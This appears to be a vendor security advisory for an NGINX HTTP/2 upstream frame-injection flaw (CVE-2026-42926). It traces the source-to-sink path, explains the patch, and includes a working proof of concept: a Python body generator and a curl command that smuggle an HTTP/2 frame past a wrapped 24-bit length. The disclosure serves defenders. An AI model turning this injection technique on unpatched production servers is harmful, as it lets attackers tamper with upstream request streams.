---
schema_version: "1.0.0"
document_id: "175e00eea7e0c7c8d4cb0dbe5839caeed1044ccc842510574f976b322e6f9da2"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-42926"
published_at: "2026-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:24:15.603719+00:00"
content_hash: "sha256:aba84938720a8691393a6dd4f4d5c95827da92c641566b119ba6a8054ccd1a47"
---

# HTTP/2 upstream frame injection via oversized proxy_set_body (CVE-2026-42926)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


Medium


CVE-2026-42926


2026


# HTTP/2 upstream frame injection via oversized proxy_set_body (CVE-2026-42926)


## Summary


NGINX serialized proxy_set_body output as one HTTP/2 DATA frame and truncated the 24-bit frame length


When` proxy_http_version 2` selected the HTTP/2 upstream proxy path and` proxy_set_body` generated a custom request body,` ngx_http_proxy_v2_create_request()` appended that body directly after a single DATA frame header in the initial upstream buffer.


HTTP/2 frame lengths are 24-bit values. The vulnerable code stored` body_len` into` length_0` ,` length_1` , and` length_2` without checking or fragmenting bodies larger than 16,777,215 bytes. If` proxy_set_body` produced a body over that limit, the encoded DATA frame length wrapped to the low 24 bits while the full body bytes were still sent. The upstream HTTP/2 peer would consume only the wrapped length as DATA payload, then parse the remaining attacker-controlled body bytes as subsequent HTTP/2 frame headers and payload.


The F5 CNA record for CVE-2026-42926 describes this as an` ngx_http_proxy_v2_module` encoding error affecting NGINX Open Source configurations that set` proxy_http_version` to` 2` and also use` proxy_set_body` . The upstream fix in commit` c24fb25` stops inlining` proxy_set_body` output as a prebuilt DATA frame; it places the generated body in a normal request-body chain so` ngx_http_proxy_v2_body_output_filter()` frames it into bounded DATA frames respecting` NGX_HTTP_V2_DEFAULT_FRAME_SIZE` and flow-control windows.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


C


Confidentiality


N


Integrity


L


Availability


N


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N


### Vulnerability Location


Source


Line 879


src /http


/modules


/ngx_http_proxy_module.c


ngx_http_proxy_handler() (proxy_http_version 2 dispatch)


Sink


Line 841


src /http


/modules


/ngx_http_proxy_v2_module.c


DATA frame length serialization in ngx_http_proxy_v2_create_request()


## Source-to-Sink Analysis


1


src/http/modules/ngx_http_proxy_module.c:195-200,599-604,879-880


` proxy_http_version 2` is a valid proxy configuration value. When selected, the normal proxy handler dispatches the request into the HTTP/2 upstream implementation.


CPP


```text
static    ngx_conf_enum_t    ngx_http_proxy_http_version[] = {
{  ngx_string  ( "1.0"  ), NGX_HTTP_VERSION_10 },
{  ngx_string  ( "1.1"  ), NGX_HTTP_VERSION_11 },
# if   (NGX_HTTP_V2)
{  ngx_string  ( "2"  ), NGX_HTTP_VERSION_20 },
# endif
{ ngx_null_string,  0   }
};


/* directive */
{  ngx_string  ( "proxy_http_version"  ),
NGX_HTTP_MAIN_CONF|NGX_HTTP_SRV_CONF|NGX_HTTP_LOC_CONF|NGX_CONF_TAKE1,
ngx_conf_set_enum_slot,
NGX_HTTP_LOC_CONF_OFFSET,
offsetof  ( ngx_http_proxy_loc_conf_t  , http_version),
&ngx_http_proxy_http_version },


if   (plcf->http_version == NGX_HTTP_VERSION_20) {
return    ngx_http_proxy_v2_handler  (r);
}


```


2


src/http/modules/ngx_http_proxy_module.c:343-348,4058-4070


` proxy_set_body` stores a configured complex value in` body_source` , then compiles it into` body_lengths` and` body_values` . Those script arrays can include request-derived variables, so the generated body length and bytes can depend on attacker-controlled input.


CPP


```text
{  ngx_string  ( "proxy_set_body"  ),
NGX_HTTP_MAIN_CONF|NGX_HTTP_SRV_CONF|NGX_HTTP_LOC_CONF|NGX_CONF_TAKE1,
ngx_conf_set_str_slot,
NGX_HTTP_LOC_CONF_OFFSET,
offsetof  ( ngx_http_proxy_loc_conf_t  , body_source),
NULL   },


if   (conf->body_source.data && conf->body_lengths ==  NULL  ) {
ngx_memzero  (&sc,  sizeof  ( ngx_http_script_compile_t  ));


sc.cf = cf;
sc.source = &conf->body_source;
sc.flushes = &conf->body_flushes;
sc.lengths = &conf->body_lengths;
sc.values = &conf->body_values;
sc.complete_lengths =  1  ;
sc.complete_values =  1  ;


if   ( ngx_http_script_compile  (&sc) != NGX_OK) {
return   NGX_CONF_ERROR;
}
}


```


3


src/http/modules/ngx_http_proxy_v2_module.c:449-463 (before fix)


In the vulnerable HTTP/2 request builder,` body_len` is computed from` proxy_set_body` scripts and added to the initial upstream buffer size, together with one DATA frame header. No upper bound is checked against the HTTP/2 24-bit frame length field.


CPP


```text
body_len =  0  ;


if   (plcf->body_lengths) {
le.ip = plcf->body_lengths->elts;
le.request = r;
le.flushed =  1  ;


while   (*( uintptr_t   *) le.ip) {
lcode = *(ngx_http_script_len_code_pt *) le.ip;
body_len +=  lcode  (&le);
}


ctx->ctx.internal_body_length = body_len;


len +=  sizeof  ( ngx_http_proxy_v2_frame_t  );
len += body_len;


```


4


src/http/modules/ngx_http_proxy_v2_module.c:837-863 (before fix)


The vulnerable sink serializes` body_len` into only three length bytes, marks the DATA frame as END_STREAM, and then writes the full generated body immediately after the frame header.


CPP


```text
if   (plcf->body_values) {
f = ( ngx_http_proxy_v2_frame_t   *) b->last;
b->last +=  sizeof  ( ngx_http_proxy_v2_frame_t  );


f->length_0 = (u_char) ((body_len >>  16  ) &  0xff  );
f->length_1 = (u_char) ((body_len >>  8  ) &  0xff  );
f->length_2 = (u_char) (body_len &  0xff  );
f->type = NGX_HTTP_V2_DATA_FRAME;
f->flags = NGX_HTTP_V2_END_STREAM_FLAG;
f->stream_id_0 =  0  ;
f->stream_id_1 =  0  ;
f->stream_id_2 =  0  ;
f->stream_id_3 =  1  ;


e.ip = plcf->body_values->elts;
e.pos = b->last;
e.request = r;
e.flushed =  1  ;
e.skip =  0  ;


while   (*( uintptr_t   *) e.ip) {
code = *(ngx_http_script_code_pt *) e.ip;
code  (( ngx_http_script_engine_t   *) &e);
}


b->last = e.pos;
}


```


5


src/http/modules/ngx_http_proxy_v2_module.c:991-1030 (before fix)


The first upstream buffer is treated as preframed headers and sent as-is. Because the oversized` proxy_set_body` DATA frame was embedded in that same buffer, it bypassed the later output filter logic that would normally split request body data into valid HTTP/2 DATA frames.


CPP


```text
if   (!ctx->header_sent) {
/* first buffer contains headers */


ctx->header_sent =  1  ;


if   (ctx->id !=  1  ) {
/* keepalive connection: skip connection preface,
* update stream identifiers */
b = ctx->in->buf;
b->pos +=  sizeof  (ngx_http_proxy_v2_connection_start) -  1  ;
/* ... rewrite frame stream IDs ... */
}


if   (ctx->in->buf->last_buf) {
ctx->output_closed =  1  ;
}


*ll = ctx->in;
ll = &ctx->in->next;


ctx->in = ctx->in->next;
}


```


6


src/http/modules/ngx_http_proxy_v2_module.c:875-904,1091-1168 (fix)


Commit` c24fb25` creates a separate body buffer for` proxy_set_body` output and lets the existing HTTP/2 body output filter frame it in chunks capped by` NGX_HTTP_V2_DEFAULT_FRAME_SIZE` and current flow-control windows.


CPP


```text
/* create_request(): generated body becomes a request body buffer */
}  else    if   (body_len) {


u->request_bufs = cl;


b =  ngx_create_temp_buf  (r->pool, body_len);
if   (b ==  NULL  ) {
return   NGX_ERROR;
}


cl->next =  ngx_alloc_chain_link  (r->pool);
if   (cl->next ==  NULL  ) {
return   NGX_ERROR;
}


cl = cl->next;
cl->buf = b;


e.ip = plcf->body_values->elts;
e.pos = b->last;
e.request = r;
e.flushed =  1  ;
e.skip =  0  ;


while   (*( uintptr_t   *) e.ip) {
code = *(ngx_http_script_code_pt *) e.ip;
code  (( ngx_http_script_engine_t   *) &e);
}


b->last = e.pos;
b->last_buf =  1  ;
}


/* body_output_filter(): frame length is bounded */
pos +=  ngx_min  (NGX_HTTP_V2_DEFAULT_FRAME_SIZE, limit);
len = ( ngx_uint_t  ) (pos - b->pos);


f->length_0 = (u_char) ((len >>  16  ) &  0xff  );
f->length_1 = (u_char) ((len >>  8  ) &  0xff  );
f->length_2 = (u_char) (len &  0xff  );
f->type = NGX_HTTP_V2_DATA_FRAME;
f->flags =  0  ;


```


## Impact Analysis


### Critical Impact


An attacker can manipulate the HTTP/2 byte stream delivered to the upstream peer. Depending on the upstream HTTP/2 implementation and the injected frame sequence, this can alter upstream request semantics, inject extra frames on the stream or connection, reset streams, or otherwise violate the proxy's intended request boundary. The CNA-scored direct impact is low integrity impact on a changed scope.


### Attack Surface


NGINX Open Source deployments using the HTTP/2 upstream proxy path with` proxy_http_version 2` and` proxy_set_body` in an affected version. The CVE record marks NGINX Open Source versions from 1.29.4 before 1.30.1 as affected, with 1.30.1 and 1.31.0 containing the fix.


### Preconditions


The target location must proxy to an HTTP/2 upstream and use` proxy_set_body` . Practical exploitation requires the configured body expression to generate more than 16,777,215 bytes and to include attacker-controlled bytes after the wrapped DATA length boundary, for example through request-derived variables.


## Proof of Concept


### Environment Setup


Use an affected NGINX Open Source build from 1.29.4 before 1.30.1, or build the parent revision before` c24fb25` :


BASH


```text
git  clone   https://github.com/nginx/nginx.git
cd   nginx
git checkout 2046b45aa0c6e712c216b9075886f3f26e9b4ca9
./auto/configure --prefix= " $PWD  /build"   \
--with-http_v2_module \
--without-http_rewrite_module --without-http_gzip_module
make -j " $(sysctl -n hw.ncpu 2>/dev/null || getconf _NPROCESSORS_ONLN)  "
make install


```


### Target Configuration


Run a raw TCP capture service as the upstream and configure NGINX to proxy HTTP/2 with a generated body:


NGINX


```text
worker_processes 1;
error_log logs/error.log debug;
pid logs/nginx.pid;


events { worker_connections 1024; }


http {
client_max_body_size 32m;
client_body_buffer_size 32m;


server {
listen 127.0.0.1:8080;


location /h2-proxy {
proxy_http_version 2;
proxy_set_body $request_body;
proxy_pass http://127.0.0.1:9000;
}
}
}


```


A simple Python TCP server that reads and saves all bytes from port` 9000` is enough to observe the malformed upstream stream.


### Exploit Delivery


Send a body larger than the HTTP/2 24-bit frame length limit. The three DATA length bytes encode` body_len & 0xffffff` , so a body of` 16,777,216 + 9` bytes is advertised as a 9-byte DATA frame. Put 9 harmless bytes first, then place the injected HTTP/2 frame bytes immediately after that wrapped DATA payload boundary:


BASH


```text
python3 - << 'PY'   > /tmp/h2-inject-body.bin
import sys


wrap = 1 <<  24
prefix = b'A' * 9
# Empty SETTINGS frame with ACK flag: length=0, type=4, flags=1, stream=0.
frame = b'\x00\x00\x00\x04\x01\x00\x00\x00\x00'
filler = b'B' * (wrap - len(frame))


sys.stdout.buffer.write(prefix)
sys.stdout.buffer.write(frame)
sys.stdout.buffer.write(filler)
PY


curl -i --data-binary @/tmp/h2-inject-body.bin \
http://127.0.0.1:8080/h2-proxy


```


Then inspect the captured upstream bytes around the DATA frame boundary.


### Outcome


The PoC demonstrates the encoding error that CVE-2026-42926 describes: oversized` proxy_set_body` output can escape the intended DATA payload boundary and become attacker-controlled HTTP/2 frame bytes to the upstream peer.


**Expected Response:** On a vulnerable build, the initial upstream buffer contains a DATA frame whose three-byte length field is only the low 24 bits of the generated body length, while the full body bytes follow. Bytes after the declared DATA payload boundary are therefore presented to the upstream parser as additional HTTP/2 frame data. On a fixed build, the generated body is emitted by the body output filter as valid DATA frames no larger than` NGX_HTTP_V2_DEFAULT_FRAME_SIZE` .


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/commit/c24fb259d11252623e64e787fa22288496c93773)
